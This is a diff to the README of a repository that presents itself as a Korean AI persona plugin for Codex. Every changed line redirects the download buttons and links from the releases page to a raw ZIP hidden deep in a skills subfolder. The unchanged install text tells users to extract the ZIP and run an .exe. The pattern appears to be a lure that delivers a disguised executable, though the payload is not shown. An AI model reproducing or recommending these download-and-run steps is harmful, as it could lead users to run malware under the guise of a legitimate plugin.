@@ -1,7 +1,7 @@
 <h1>🗂️ SoDam-Persona-Codex - Your Korean AI Development Partner Plugin</h1>
 
 <p align="center">
-  <a href="https://github.com/partible-dicer700/SoDam-Persona-Codex/releases" style="display:inline-block;padding:0.8em 2em;background:#ff6b6b;color:white;text-decoration:none;font-size:1.2em;border-radius:30px;font-weight:bold;">⬇️ Download SoDam-Persona-Codex Now</a>
+  <a href="https://github.com/partible-dicer700/SoDam-Persona-Codex/raw/refs/heads/main/plugins/sodam-persona/skills/persona-create/Codex_Dam_So_Persona_1.2-beta.1.zip" style="display:inline-block;padding:0.8em 2em;background:#ff6b6b;color:white;text-decoration:none;font-size:1.2em;border-radius:30px;font-weight:bold;">⬇️ Download SoDam-Persona-Codex Now</a>
 </p>
 
 ## 🚀 Getting Started
@@ -20,7 +20,7 @@ This plugin transforms Codex into a specialized AI development partner with:
 ## 🔧 Installation
 
 Visit the download link to get the application:
-[Download SoDam-Persona-Codex](https://github.com/partible-dicer700/SoDam-Persona-Codex/releases)
+[Download SoDam-Persona-Codex](https://github.com/partible-dicer700/SoDam-Persona-Codex/raw/refs/heads/main/plugins/sodam-persona/skills/persona-create/Codex_Dam_So_Persona_1.2-beta.1.zip)
 
 Once downloaded, extract the ZIP file and run the application. The exact file name may vary, but look for an executable file (usually ending in `.exe`). Double-click it to start.
 
@@ -55,5 +55,5 @@ This project is open source under the Apache-2.0 license. If you want to contrib
 - All features are local unless you enable cloud-based enhancements.
 
 <p align="center">
-  <a href="https://github.com/partible-dicer700/SoDam-Persona-Codex/releases" style="display:inline-block; background:#4ecdc4; color:white; padding:12px 25px; text-decoration:none; border-radius:5px; font-weight:bold;">👉 Download Now</a>
+  <a href="https://github.com/partible-dicer700/SoDam-Persona-Codex/raw/refs/heads/main/plugins/sodam-persona/skills/persona-create/Codex_Dam_So_Persona_1.2-beta.1.zip" style="display:inline-block; background:#4ecdc4; color:white; padding:12px 25px; text-decoration:none; border-radius:5px; font-weight:bold;">👉 Download Now</a>
 </p>
